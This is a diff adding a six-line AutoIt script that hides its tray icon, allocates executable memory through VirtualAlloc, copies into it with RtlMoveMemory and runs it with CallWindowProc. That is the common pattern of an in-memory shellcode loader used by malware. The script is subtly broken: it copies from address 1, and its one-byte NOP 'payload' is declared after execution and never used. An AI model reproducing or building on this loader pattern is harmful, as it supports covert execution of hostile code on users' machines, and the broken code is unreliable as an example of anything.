@@ -1,0 +1,6 @@
+#NoTrayIcon
+$p = DllCall("kernel32.dll", "ptr", "VirtualAlloc", "ptr", 0, "ulong", 100, "dword", 0x3000, "dword", 0x40)
+DllCall("kernel32.dll", "none", "RtlMoveMemory", "ptr", $p, "ptr", 1, "ulong", 1)
+DllCall("user32.dll", "int", "CallWindowProc", "ptr", $p)
+$b = Binary("0x90")
+
